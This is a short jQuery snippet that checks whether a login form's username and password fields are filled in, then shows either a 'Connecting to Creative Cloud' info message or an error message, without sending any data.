$(function(){
var textfield = $("input[name=user]");
var passwordfield = $('#passwordfield');

            $('button[type="submit"]').click(function(e) {
                e.preventDefault();
                //little validation just to check username
                if (textfield.val() != "" && passwordfield.val() != "") {
                    //$("body").scrollTo("#output");
                    
                    $("#output").removeClass(' alert-danger');
                    
                    $("#output").addClass(" alert alert-info").html("Connecting to Creative Cloud ");
                    
                    
                } else {
                    //remove success mesage replaced with error message
                    $("#output").removeClass(' alert alert-success');
                    $("#output").addClass("alert alert-danger").html("sorry enter a username and password ");
                }

            });
});